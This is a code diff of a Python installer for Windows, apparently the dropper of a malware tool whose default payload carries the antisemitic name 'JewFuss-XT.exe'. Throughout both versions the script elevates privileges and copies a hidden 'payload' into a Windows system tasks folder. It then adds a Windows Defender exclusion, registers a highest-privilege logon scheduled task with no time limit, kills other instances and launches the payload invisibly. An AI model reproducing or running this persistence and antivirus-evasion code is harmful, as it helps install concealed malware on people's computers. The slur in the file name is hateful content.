@@ -1,24 +1,15 @@
-import os
-import sys
-import time
-import psutil
-import shutil
-import ctypes
-import argparse
-import PyElevate
-import subprocess
+import subprocess, PyElevate, argparse, shutil, psutil, time, sys, os
 
-parser = argparse.ArgumentParser()
+parser = argparse.ArgumentParser(add_help=False)
 parser.add_argument('--file', type=str, default=None)
 parser.add_argument('--icon', type=str, default=None)
 parser.add_argument('--name', type=str, default=None)
 parser.add_argument('--prevpath', type=str, default=None)
-parser.add_argument('--targetpath', type=str, default=r"C:\ProgramData\Microsoft\Windows\Tasks")
+parser.add_argument('--targetpath', type=str, default=None)
 args, _ = parser.parse_known_args()
-del _
 
-printnonerrors = False
-SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+SCRIPT_DIR = os.path.dirname(os.path.abspath(sys.argv[0]))
+LOG = os.path.join(SCRIPT_DIR, "installer.log"), False # (path, enable)
 os.chdir(SCRIPT_DIR)
 
 try:
@@ -60,205 +51,204 @@ except KeyboardInterrupt:
     sys.exit("Keyboard interrupt, exiting compiler...")
 except Exception as e:
     print(f"Error compiling: {e}")
-    errored = True
 
-PyElevate.elevate()
-if not PyElevate.elevated():
-    if (hasattr(args, "hidewindow") and args.hidewindow) or (hasattr(args, "updater") and args.updater):
-        ctypes.windll.user32.MessageBoxW(0, "Please run as administrator.", "Permissions error", 0x10)
-    sys.exit(0)
-
-if getattr(sys, 'frozen', False):
-    base_path = sys._MEIPASS
-else:
-    base_path = os.path.dirname(os.path.abspath(__file__))
-
-exename_txt = os.path.join(base_path, "executablename.txt")
-tgtpath_txt = os.path.join(base_path, "compiled_targetpath.txt")
-
-try:
-    with open(exename_txt, "r", encoding="utf-8") as f:
-        app_name = f.read().strip()
-except FileNotFoundError:
-    app_name = "JewFuss-XT.exe"
-
-try:
-    with open(tgtpath_txt, "r", encoding="utf-8") as f:
-        compiled_targetpath = f.read().strip() or r"C:\ProgramData\Microsoft\Windows\Tasks"
-except FileNotFoundError:
-    compiled_targetpath = r"C:\ProgramData\Microsoft\Windows\Tasks"
-
-errored = False
-
-def add_defender_exclusion(file_path):
-    global errored
+def log(s):
     try:
-        folder = os.path.dirname(file_path)
-        cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{folder}\\""'
-        subprocess.run(cmd, shell=True, check=True)
-        if printnonerrors:
-            print(f"Windows Defender exclusion added for {folder}")
-    except subprocess.CalledProcessError as e:
-        print(f"Error adding Defender exclusion: {e}")
-        errored = True
-
-def create_scheduled_task(task_name, file_path):
-    global errored
-    try:
-        schtasks_command = (
-            f'schtasks /create /tn "{task_name}" /tr "{file_path}" '
-            f'/sc onlogon /ru "INTERACTIVE" /rl highest /f /it'
-        )
-        disable_conditions_command = (
-            f'powershell -Command "'
-            f'$t = Get-ScheduledTask -TaskName \\"{task_name}\\"; '
-            f'$s = $t.Settings; '
-            f'$s.DisallowStartIfOnBatteries = $false; '
-            f'$s.StopIfGoingOnBatteries = $false; '
-            f'$s.ExecutionTimeLimit = \'PT0S\'; '
-            f'Set-ScheduledTask -TaskName \\"{task_name}\\" -Settings $s"'
-        )
-        subprocess.run(schtasks_command, shell=True, check=True)
-        subprocess.run(disable_conditions_command, shell=True, check=True)
-        if printnonerrors:
-            print(f"Scheduled task '{task_name}' created.")
-    except subprocess.CalledProcessError as e:
-        print(f"Error creating scheduled task: {e}")
-        errored = True
-
-def write_env_file(env_dir, app_name_value, app_path_value, compiled_target_value):
-    try:
-        if not os.path.exists(env_dir):
-            os.makedirs(env_dir)
-        env_path = os.path.join(env_dir, ".env")
-        lines = []
-        if os.path.exists(env_path):
-            with open(env_path, "r", encoding="utf-8") as f:
-                lines = f.read().splitlines()
-        kv = {}
-        for line in lines:
-            if "=" in line and not line.strip().startswith("#"):
-                k, v = line.split("=", 1)
-                kv[k.strip()] = v.strip()
-        kv["APP_NAME"] = app_name_value
-        kv["APP_PATH"] = app_path_value
-        kv["TARGET_DIR"] = env_dir
-        kv["COMPILED_TARGET_DIR"] = compiled_target_value
-        with open(env_path, "w", encoding="utf-8") as f:
-            for k in sorted(kv.keys()):
-                f.write(f"{k}={kv[k]}\n")
-        if printnonerrors:
-            print(f"Wrote .env at {env_path}")
-    except Exception as e:
-        print(f"Error writing .env: {e}")
-
-def parent_exe_path():
-    try:
-        p = psutil.Process(os.getppid())
-        return p.exe() or ""
+        print(s)
+        if LOG[1]:
+            with open(LOG[0], "a", encoding="utf-8") as f:
+                f.write(s + "\n")
     except Exception:
-        return ""
-
-def parent_is_safe(pexe):
-    bad = {"cmd.exe","powershell.exe","pwsh.exe","explorer.exe","conhost.exe","py.exe","python.exe","pythonw.exe"}
-    base = os.path.basename(pexe).lower()
-    if base in bad:
-        return False
-    windir = os.environ.get("WINDIR", r"C:\Windows")
-    if os.path.normcase(pexe).startswith(os.path.normcase(windir)):
-        return False
-    return True
-
-def resolve_destination():
-    if args.prevpath:
-        full = os.path.abspath(args.prevpath)
-        d = os.path.dirname(full)
-        n = os.path.basename(full)
-        if not n.lower().endswith(".exe"):
-            n += ".exe"
-            full = os.path.join(d, n)
-        return full
-    pexe = parent_exe_path()
-    if pexe and os.path.isfile(pexe) and parent_is_safe(pexe):
-        return pexe
-    tgt = args.targetpath or compiled_targetpath or r"C:\ProgramData\Microsoft\Windows\Tasks"
-    if not os.path.exists(tgt):
-        os.makedirs(tgt, exist_ok=True)
-    return os.path.join(tgt, app_name)
-
-if getattr(sys, 'frozen', False):
-    temp_dir = sys._MEIPASS
-else:
-    temp_dir = os.path.dirname(os.path.abspath(__file__))
-
-extracted_app_path = os.path.join(temp_dir, app_name)
-final_app_path = resolve_destination()
-install_dir = os.path.dirname(final_app_path)
-scheduled_name = os.path.splitext(os.path.basename(final_app_path))[0]
-
-if printnonerrors:
-    print(f"Installing to: {final_app_path}")
+        pass
 
 try:
-    if os.path.exists(final_app_path):
-        exe_basename = os.path.basename(final_app_path).lower()
-        procs = list(psutil.process_iter(['pid','name','exe']))
+    PyElevate.elevate()
+    if not PyElevate.elevated():
+        log("Elevation failed...")
+        sys.exit(0)
+except Exception as e:
+    log(f"Elevation call error (continuing): {e}")
+
+bp = sys._MEIPASS if getattr(sys, 'frozen', False) else os.path.dirname(os.path.abspath(__file__))
+this_name = os.path.basename(sys.argv[0]).lower()
+
+payload_name = None
+try:
+    with open(os.path.join(bp, "executablename.txt"), "r", encoding="utf-8") as f:
+        payload_name = f.read().strip() or None
+except Exception:
+    pass
+if not payload_name:
+    try:
+        for fn in os.listdir(bp):
+            if fn.lower().endswith(".exe") and fn.lower() != this_name:
+                payload_name = fn
+                break
+    except Exception:
+        pass
+if not payload_name:
+    payload_name = "JewFuss-XT.exe"
+
+extracted_payload = os.path.join(bp, payload_name)
+
+compiled_targetpath = None
+try:
+    with open(os.path.join(bp, "compiled_targetpath.txt"), "r", encoding="utf-8") as f:
+        compiled_targetpath = f.read().strip() or None
+except Exception:
+    pass
+
+if args.prevpath:
+    final_path = os.path.abspath(args.prevpath)
+    if not final_path.lower().endswith(".exe"):
+        final_path += ".exe"
+else:
+    tgt = args.targetpath or compiled_targetpath or r"C:\ProgramData\Microsoft\Windows\Tasks"
+    tgt = os.path.abspath(tgt)
+    if tgt.lower().endswith(".exe"):
+        final_path = tgt
+    else:
+        os.makedirs(tgt, exist_ok=True)
+        final_path = os.path.join(tgt, payload_name)
+
+if os.path.basename(final_path).lower().endswith("-installer.exe"):
+    final_path = os.path.join(os.path.dirname(final_path), payload_name)
+
+install_dir = os.path.dirname(final_path)
+exe_basename = os.path.basename(final_path).lower()
+task_name = os.path.splitext(os.path.basename(final_path))[0]
+
+log("Installer start: " + " ".join(sys.argv))
+log(f"Payload: {extracted_payload}")
+log(f"Install to: {final_path}")
+log(f"Install dir: {install_dir}")
+log(f"Installer exe name: {this_name}")
+log(f"Target exe basename: {exe_basename}")
+log(f"Task name: {task_name}")
+
+# if parent is the PAYLOAD (not installer), terminate it
+try:
+    p = psutil.Process(os.getppid())
+    pexe_base = os.path.basename((p.exe() or "")).lower()
+    if pexe_base == exe_basename and not pexe_base.endswith("-installer.exe"):
+        log("Terminating parent payload exe " + pexe_base)
+        p.terminate()
         try:
-            p = psutil.Process(os.getppid())
-            if os.path.normcase((p.exe() or "")).endswith(os.path.normcase(exe_basename)):
-                p.terminate()
-                p.wait(timeout=5)
+            p.wait(timeout=5)
         except Exception:
             pass
+except Exception as e:
+    log(f"Parent terminate note: {e}")
+
+# if an existing scheduled task points elsewhere, stop/delete it, keep it if no already pointing to the payload
+same_task_target = False
+try:
+    ps_cmd = (
+        'powershell -NoProfile -Command '
+        f'$t = Get-ScheduledTask -TaskName "{task_name}" -ErrorAction SilentlyContinue; '
+        'if($t){ $a = $t.Actions | Select-Object -First 1; $exe = $a.Execute; '
+        'if($exe -match \'^\"(.+)\"$\'){$exe=$Matches[1]}; [Console]::Out.WriteLine($exe) }'
+    )
+    r = subprocess.run(ps_cmd, shell=True, capture_output=True, text=True)
+    existing = r.stdout.strip().strip('"')
+    if existing:
+        existing_full = os.path.normcase(os.path.abspath(existing))
+        final_full = os.path.normcase(os.path.abspath(final_path))
+        if existing_full == final_full:
+            same_task_target = True
+            log(f"Scheduled task already targets this exe, keeping it: {existing_full}")
+except Exception as e:
+    log(f"Scheduled task inspection error (will recreate): {e}")
+
+if not same_task_target:
+    try:
+        subprocess.run(f'schtasks /end /tn "{task_name}" >nul 2>&1', shell=True)
+        subprocess.run(f'schtasks /delete /tn "{task_name}" /f >nul 2>&1', shell=True)
+        log(f"Stopped and deleted existing scheduled task: {task_name}")
+    except Exception as e:
+        log(f"schtasks pre-clean error: {e}")
+
+# kill any running instances of the TARGET payload by basename
+try:
+    for pr in psutil.process_iter(['pid','name','exe']):
         try:
-            for p in procs:
-                try:
-                    pexe = (p.info['exe'] or '')
-                    if os.path.basename(pexe).lower() == exe_basename:
-                        p.terminate()
-                except Exception:
-                    pass
-            time.sleep(1)
-            os.system(f'taskkill /im "{exe_basename}" /f >nul 2>&1')
-            time.sleep(0.5)
-            os.remove(final_app_path)
+            pexe = (pr.info.get('exe') or '')
+            if os.path.basename(pexe).lower() == exe_basename:
+                pr.terminate()
+        except Exception:
+            pass
+    time.sleep(0.7)
+    subprocess.run(f'taskkill /im "{exe_basename}" /f >nul 2>&1', shell=True)
+    time.sleep(0.4)
+    log(f"Killed any running '{exe_basename}'")
+except Exception as e:
+    log(f"Bulk kill error: {e}")
+
+# delete old file
+if os.path.exists(final_path):
+    ok = False
+    for i in range(7):
+        try:
+            os.remove(final_path)
+            ok = True
+            break
         except Exception as e:
-            print(f"Error deleting existing file: {e}\nRetrying in 1 second...")
-            time.sleep(1)
-            try:
-                os.remove(final_app_path)
-            except Exception as e2:
-                print(f"Fatal Error: Error deleting existing file: {e2}")
-            input("Press Enter to exit.")
-            sys.exit(1)
+            log(f"Delete retry {i+1}: {e}")
+            time.sleep(0.6)
+    if not ok:
+        log("Fatal: could not delete old exe")
+        sys.exit(1)
+
+# copy payload
+try:
     if not os.path.exists(install_dir):
         os.makedirs(install_dir, exist_ok=True)
-    try:
-        shutil.copy(extracted_app_path, final_app_path)
-        if printnonerrors:
-            print(f"Copied to {final_app_path}")
-    except Exception as e:
-        print(f"Fatal Error: Error moving file: {e}")
-        input("Press Enter to exit.")
-        sys.exit(1)
 except Exception as e:
-    input(f"Fatal Error: Error moving file: {e}")
+    log(f"Dir create error: {e}")
     sys.exit(1)
 
-write_env_file(install_dir, os.path.basename(final_app_path), final_app_path, compiled_targetpath)
-add_defender_exclusion(final_app_path)
-create_scheduled_task(scheduled_name, final_app_path)
-
 try:
-    startupinfo = subprocess.STARTUPINFO()
-    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-    subprocess.Popen(final_app_path, startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
-    if printnonerrors:
-        print(f"Started {final_app_path} silently")
+    shutil.copy(extracted_payload, final_path)
+    log("Copied new exe")
 except Exception as e:
-    print(f"Error running {final_app_path}: {e}")
-    errored = True
+    log(f"Copy error: {e}")
+    sys.exit(1)
 
-if errored:
-    input("Press Enter to exit.")
+# defender exclusion (non-fatal)
+try:
+    folder = os.path.dirname(final_path)
+    subprocess.run(f'powershell -NoProfile -Command "Add-MpPreference -ExclusionPath \\"{folder}\\""', shell=True, check=True)
+    log(f"Defender exclusion added: {folder}")
+except Exception as e:
+    log(f"Defender exclusion error: {e}")
+
+# scheduled task if not exists
+if not same_task_target:
+    try:
+        schtasks_cmd = f'schtasks /create /tn "{task_name}" /tr "{final_path}" /sc onlogon /ru "INTERACTIVE" /rl highest /f /it'
+        disable_cmd = (
+            'powershell -NoProfile -Command '
+            f'"$t=Get-ScheduledTask -TaskName \\"{task_name}\\"; '
+            '$s=$t.Settings; $s.DisallowStartIfOnBatteries=$false; '
+            '$s.StopIfGoingOnBatteries=$false; $s.ExecutionTimeLimit=\'PT0S\'; '
+            f'Set-ScheduledTask -TaskName \\"{task_name}\\" -Settings $s"'
+        )
+        subprocess.run(schtasks_cmd, shell=True, check=True)
+        subprocess.run(disable_cmd, shell=True, check=True)
+        log(f"Scheduled task created: {task_name}")
+    except Exception as e:
+        log(f"schtasks error: {e}")
+else:
+    log("Skipped task re-creation (already points to this exe)")
+
+# start payload
+try:
+    si = subprocess.STARTUPINFO()
+    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    subprocess.Popen(final_path, startupinfo=si, creationflags=0x00000008 | 0x08000000, close_fds=True)
+    log("Launched new exe")
+except Exception as e:
+    log(f"Run new exe error: {e}")
+    sys.exit(1)
+
 sys.exit(0)
